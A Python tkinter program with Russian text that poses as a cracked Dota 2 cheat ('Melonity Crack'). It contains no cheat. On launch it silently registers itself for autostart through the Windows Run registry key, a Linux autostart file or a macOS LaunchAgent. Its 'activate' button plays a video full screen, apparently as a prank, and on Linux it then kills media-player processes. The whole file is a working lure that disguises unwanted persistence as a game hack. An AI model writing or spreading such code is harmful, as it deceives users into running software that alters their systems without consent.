import tkinter as tk
from tkinter import messagebox
import os
import subprocess
import sys
import threading
import time
import platform
import pygame
import pyautogui
import shutil
import atexit

# Проверка ОС
IS_WINDOWS = platform.system() == 'Windows'
IS_MAC = platform.system() == 'Darwin'
IS_LINUX = platform.system() == 'Linux'

# Инициализация pygame для воспроизведения звука
pygame.mixer.init()

class CheatApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Dota 2 Melonity Crack By @Bengamin_Button")
        self.root.geometry("800x550")
        self.root.configure(bg="#1e1e2e")
        self.root.resizable(False, False)
        self.center_window()
        
        # Добавляем в автозагрузку
        self.add_to_startup()
        
        # Создаем основной фрейм
        main_frame = tk.Frame(
            root, 
            bg="#302d41",
            bd=0,
            highlightthickness=0,
            relief="flat"
        )
        main_frame.place(relx=0.5, rely=0.5, anchor="center", width=750, height=500)
        
        # Canvas для закругленных углов
        self.canvas = tk.Canvas(
            main_frame,
            bg="#1e1e2e",
            highlightthickness=0,
            width=750,
            height=500
        )
        self.canvas.pack(fill="both", expand=True)
        self.canvas.create_rectangle(
            0, 0, 750, 500, 
            fill="#302d41", 
            outline="#6c5ce7",
            width=2,
            tags="bg"
        )
        
        # Заголовок
        title_label = tk.Label(
            self.canvas,
            text="MELONITY CRACK BY @BENGAMIN_BUTTON",
            font=("Arial", 28, "bold"),
            fg="#a29bfe",
            bg="#302d41",
            pady=20
        )
        self.canvas.create_window(375, 70, window=title_label)
        
        # Описание
        desc_text = "Получите невероятное преимущество в Dota 2 с Melonity (КРЯК)!\n" \
                    "Активация даёт вам:\n" \
                    "• Видимость через туман войны\n" \
                    "• Авто-увороты от способностей\n" \
                    "• Точные предсказания здоровья\n" \
                    "• И многое другое!"
        
        desc_label = tk.Label(
            self.canvas,
            text=desc_text,
            font=("Arial", 12),
            fg="#dfe6e9",
            bg="#302d41",
            justify="center",
            padx=20,
            pady=10
        )
        self.canvas.create_window(375, 180, window=desc_label)
        
        # Кнопка активации
        self.activate_button = tk.Button(
            self.canvas,
            text="АКТИВИРОВАТЬ ЧИТЫ",
            command=self.activate_cheats,
            font=("Arial", 18, "bold"),
            bg="#6c5ce7",
            fg="white",
            activebackground="#a29bfe",
            activeforeground="white",
            padx=25,
            pady=15,
            borderwidth=0,
            relief="flat",
            cursor="hand2",
            highlightthickness=0
        )
        self.canvas.create_window(375, 300, window=self.activate_button)
        
        # Нижний текст
        footer_text = "Внимание: Использование читов может привести к блокировке аккаунта. " \
                      "Используйте на свой страх и риск!\n\n" \
                      "Авторы: t.me/Bengamin_Button и t.me/XillenAdapter"
        
        footer_label = tk.Label(
            self.canvas,
            text=footer_text,
            font=("Arial", 9),
            fg="#b2bec3",
            bg="#302d41",
            pady=10,
            wraplength=700
        )
        self.canvas.create_window(375, 420, window=footer_label)
        
        # Эффекты при наведении
        self.activate_button.bind("<Enter>", lambda e: self.activate_button.config(bg="#a29bfe"))
        self.activate_button.bind("<Leave>", lambda e: self.activate_button.config(bg="#6c5ce7"))
        
        # Проиграть звук при запуске
        self.play_sound("start")

    def center_window(self):
        self.root.update_idletasks()
        width = self.root.winfo_width()
        height = self.root.winfo_height()
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        x = (screen_width // 2) - (width // 2)
        y = (screen_height // 2) - (height // 2)
        self.root.geometry(f'+{x}+{y}')

    def play_sound(self, sound_type):
        """Генерирует и воспроизводит звук"""
        try:
            if sound_type == "start":
                # Генерируем позитивный звук
                pygame.mixer.Sound(buffer=bytearray([128] * 44100)).play()
            elif sound_type == "error":
                # Генерируем звук ошибки
                pygame.mixer.Sound(buffer=bytearray([255] * 22050 + [0] * 22050)).play()
        except:
            pass

    def add_to_startup(self):
        """Добавляет программу в автозагрузку"""
        try:
            # Получаем путь к текущему исполняемому файлу
            app_path = os.path.abspath(sys.argv[0])
            
            # Для Windows
            if IS_WINDOWS:
                import winreg
                # Имя для записи в реестр
                app_name = "Dota2Cheats"
                
                # Открываем ключ автозагрузки
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, 
                    winreg.KEY_WRITE
                )
                
                # Устанавливаем значение
                winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, f'"{app_path}" --autostart')
                winreg.CloseKey(key)
                
            # Для Linux (Gnome, XFCE, KDE)
            elif IS_LINUX:
                autostart_dir = os.path.expanduser("~/.config/autostart")
                os.makedirs(autostart_dir, exist_ok=True)
                
                desktop_file = os.path.join(autostart_dir, "dota2cheats.desktop")
                
                with open(desktop_file, "w") as f:
                    f.write(f"""[Desktop Entry]
Type=Application
Name=Dota 2 Cheats
Exec=python3 "{app_path}" --autostart
Terminal=false
""")
                
                # Даем права на выполнение
                os.chmod(desktop_file, 0o755)
                
            # Для MacOS
            elif IS_MAC:
                launch_agents_dir = os.path.expanduser("~/Library/LaunchAgents")
                os.makedirs(launch_agents_dir, exist_ok=True)
                
                plist_file = os.path.join(launch_agents_dir, "com.user.dota2cheats.plist")
                
                with open(plist_file, "w") as f:
                    f.write(f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.user.dota2cheats</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{app_path}</string>
        <string>--autostart</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
""")
            
        except Exception as e:
            print(f"Ошибка добавления в автозагрузку: {e}")

    def remove_from_startup(self):
        """Удаляет программу из автозагрузки"""
        try:
            # Для Windows
            if IS_WINDOWS:
                import winreg
                # Имя для удаления из реестра
                app_name = "Dota2Cheats"
                
                # Открываем ключ автозагрузки
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, 
                    winreg.KEY_WRITE
                )
                
                # Удаляем значение
                winreg.DeleteValue(key, app_name)
                winreg.CloseKey(key)
                
            # Для Linux
            elif IS_LINUX:
                desktop_file = os.path.expanduser("~/.config/autostart/dota2cheats.desktop")
                if os.path.exists(desktop_file):
                    os.remove(desktop_file)
                    
            # Для MacOS
            elif IS_MAC:
                plist_file = os.path.expanduser("~/Library/LaunchAgents/com.user.dota2cheats.plist")
                if os.path.exists(plist_file):
                    os.remove(plist_file)
            
        except Exception as e:
            print(f"Ошибка удаления из автозагрузки: {e}")

    def activate_cheats(self):
        # Проиграть звук активации
        self.play_sound("start")
        
        # Показать сообщение о начале активации
        messagebox.showinfo(
            "Активация начата", 
            "MelonityCrack читы активируются! Подготовьтесь к игре...\n\n"
            "Через 3 секунды откроется видео-инструкция."
        )
        
        # Запустить видео через 3 секунды в отдельном потоке
        threading.Timer(3.0, self.play_video).start()
        
        # Закрыть главное окно
        self.root.destroy()

    def get_video_path(self):
        """Получает абсолютный путь к видеофайлу"""
        # Получаем путь к директории скрипта
        base_path = os.path.dirname(os.path.abspath(sys.argv[0]))
        
        # Проверяем несколько возможных местоположений
        possible_paths = [
            os.path.join(base_path, "video.mp4"),
            os.path.join(base_path, "video", "video.mp4"),
            os.path.join(os.path.expanduser("~"), "video.mp4"),
            os.path.join(os.getcwd(), "video.mp4")
        ]
        
        # Ищем существующий файл
        for path in possible_paths:
            if os.path.exists(path):
                return path
        
        # Если файл не найден, создаем сообщение об ошибке
        error_msg = "Видеофайл не найден! Проверьте наличие файла video.mp4 в:\n"
        error_msg += "\n".join(possible_paths)
        messagebox.showerror("Ошибка", error_msg)
        self.play_sound("error")
        return None

    def play_video(self):
        try:
            # Получаем путь к видео
            video_path = self.get_video_path()
            if not video_path:
                return
                
            # Получаем размер экрана
            screen_width, screen_height = pyautogui.size()
            
            # Открываем видео в полноэкранном режиме
            if IS_WINDOWS:
                os.startfile(video_path)
                time.sleep(1)
                pyautogui.press('f')  # Пытаемся перевести в полноэкранный режим
            elif IS_MAC:
                subprocess.run(["open", video_path])
                time.sleep(1)
                pyautogui.press('f')  # Пытаемся перевести в полноэкранный режим
            else:  # Linux
                # Список возможных плееров
                players = [
                    "vlc --fullscreen", 
                    "mpv --fs", 
                    "mplayer -fs", 
                    "smplayer -fullscreen",
                    "totem --fullscreen",
                    "xplayer --fullscreen",
                    "parole --fullscreen"
                ]
                
                # Пытаемся использовать любой доступный плеер
                player_found = False
                for player in players:
                    try:
                        subprocess.Popen(player.split() + [video_path])
                        player_found = True
                        time.sleep(2)
                        # Дополнительно нажимаем F11 для полноэкранного режима
                        pyautogui.press('f11')
                        break
                    except Exception as e:
                        print(f"Ошибка при запуске {player}: {e}")
                        continue
                
                # Если ни один плеер не найден, используем xdg-open
                if not player_found:
                    try:
                        print("Используем xdg-open как резервный вариант")
                        subprocess.Popen(["xdg-open", video_path])
                        time.sleep(2)
                        pyautogui.press('f11')
                    except Exception as e:
                        print(f"Ошибка при запуске xdg-open: {e}")
                        messagebox.showerror(
                            "Ошибка", 
                            "Не удалось открыть видео. Установите видеоплеер (например VLC).\n"
                            "Для Arch Linux: sudo pacman -S vlc\n"
                            "Для Ubuntu: sudo apt install vlc"
                        )
                        self.play_sound("error")
                        self.remove_from_startup()
                        sys.exit(1)
            
            # Сообщение о необходимости Ctrl+C
            print("Видео запущено! Для выхода нажмите Ctrl+C в этой консоли.")
            
            # Ожидаем Ctrl+C
            try:
                while True:
                    time.sleep(0.1)
            except KeyboardInterrupt:
                print("Выход по Ctrl+C")
            
        except Exception as e:
            # Создаем временное окно для отображения ошибки
            root = tk.Tk()
            root.withdraw()
            messagebox.showerror("Ошибка", f"Не удалось воспроизвести видео:\n{str(e)}")
            root.destroy()
            self.play_sound("error")
        finally:
            # Удаляем из автозагрузки
            self.remove_from_startup()
                
            # Завершаем все процессы плееров (для Linux)
            if IS_LINUX:
                try:
                    subprocess.run(["pkill", "vlc"])
                    subprocess.run(["pkill", "mpv"])
                    subprocess.run(["pkill", "mplayer"])
                    subprocess.run(["pkill", "smplayer"])
                    subprocess.run(["pkill", "totem"])
                    subprocess.run(["pkill", "xplayer"])
                    subprocess.run(["pkill", "parole"])
                except:
                    pass
                
            sys.exit()

def run_video_only():
    """Запускает только видео (для автозагрузки)"""
    app = CheatApp.__new__(CheatApp)
    app.play_video()

if __name__ == "__main__":
    # Проверяем аргументы командной строки
    if "--autostart" in sys.argv:
        # Если запущено из автозагрузки, сразу запускаем видео
        run_video_only()
    else:
        # Иначе показываем графический интерфейс
        root = tk.Tk()
        app = CheatApp(root)
        root.mainloop()
